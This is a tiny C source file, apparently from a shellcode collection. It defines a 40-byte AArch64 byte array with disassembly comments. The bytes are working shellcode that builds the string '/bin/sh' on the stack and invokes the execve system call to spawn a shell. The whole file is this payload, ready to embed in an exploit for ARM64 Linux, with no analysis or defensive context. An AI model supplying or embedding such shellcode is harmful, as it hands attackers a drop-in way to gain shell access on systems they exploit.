// Target architecture : ARMv8/AArch64 arm
// Endian mode         : little

#define EXECVE_SIZE 40

char EXECVE[] = {
  /* 0000 */ "\xa8\x1b\x80\xd2" /* movz x8, #0xdd                      */
  /* 0004 */ "\xe2\x03\x1f\xaa" /* mov  x2, xzr                        */
  /* 0008 */ "\xe1\x03\x1f\xaa" /* mov  x1, xzr                        */
  /* 000C */ "\xe3\x45\x8c\xd2" /* movz x3, #0x622f                    */
  /* 0010 */ "\x23\xcd\xad\xf2" /* movk x3, #0x6e69, lsl #16           */
  /* 0014 */ "\xe3\x65\xce\xf2" /* movk x3, #0x732f, lsl #32           */
  /* 0018 */ "\x03\x0d\xe0\xf2" /* movk x3, #0x68, lsl #48             */
  /* 001C */ "\xe3\x0f\x1f\xf8" /* str  x3, [sp, #0xfffffffffffffff0]! */
  /* 0020 */ "\xe0\x03\x00\x91" /* mov  x0, sp                         */
  /* 0024 */ "\x01\x00\x00\xd4" /* svc  #0                             */
};
